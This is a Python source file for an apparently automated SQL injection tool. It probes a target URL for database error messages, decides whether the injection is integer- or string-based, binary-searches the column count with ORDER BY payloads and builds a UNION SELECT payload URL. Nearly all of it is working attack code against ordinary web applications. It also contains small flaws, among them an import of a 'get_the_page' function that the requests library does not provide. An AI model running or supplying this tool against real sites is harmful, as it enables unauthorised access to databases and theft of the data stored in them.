from requests import get_the_page

errors = ["You have an error in your SQL syntax", "mysqli_fetch_assoc()", "Unknown column", "404 Error", "mysql_num_rows()",
          "mysql_fetch_array()", "Error Occurred While Processing Request", "Server Error in '/' Application",
          "Microsoft OLE DB Provider for ODBC Drivers error", "error in your SQL syntax", "include()",
          "Invalid Querystring", "OLE DB Provider for ODBC", "VBScript Runtime", "ADODB.Field", "BOF or EOF",
          "ADODB.Command", "JET Database", "mysql_fetch_row()", "Syntax error", "mysql_fetch_assoc()", "mysql_fetch_object()",
          "mysql_numrows()", "GetArray()", "FetchRow()", "input string was not in a correct format",
          "MSSQL_Uqm: Unclosed quotation mark", "JDBC_CFM2 : SQLServer JDBC Driver",
          "JDBC_CFM': Error Executing Database Query", "Oracle: ORA-01756", "Division by zero", "Failed Query of select"]


def ft_cols(site):
    based, f_error = based_on(site)
    site1 = site
    if based == '':
        site1 = site.replace("'", "")
    site1 = site1+"+order+by+"
    col_back = 40
    col_front = 1
    check_col = 20
    a = 2
    while a > 1:
        a = col_back - col_front
        site = site1+"%d--" % check_col + based
        the_page = get_the_page(site, "1")
        if f_error in the_page:
            col_back = check_col
        else:
            col_front = check_col
        check_col = (col_front+col_back)/2
    print("Selected Column Count is %d." % col_front)

    return int(col_front), based


def uni_cols(site, columns, based):
    site1 = site
    num_columns = "1"
    for i in range(2, columns + 1):
        num_columns = num_columns + "," + str(i)
    site = site1 + "+UNION+SELECT+%s--" % num_columns + based
    if based == '':
        site = site.replace("'", "")

    return site


def based_on(site):
    site = site.replace("'", '')
    site = site+"+order+by+100--"
    error = ''
    error = find_error(site)
    if error != '':
        print('The SQL injection is integer based')
        return '', error
    else:
        site = site.replace("+order+by+100--", "'+order+by+100--+-")
        error = find_error(site)
        if error != '':
            print("The SQL injection is string based")
            return "+-", error
        else:
            print("Could not take total number of columns")
            print("Program will exit")
            exit()


def find_error(site):
    the_page = get_the_page(site, "1")
    for index in errors:
        if index in the_page:
            return index
        
    return ''
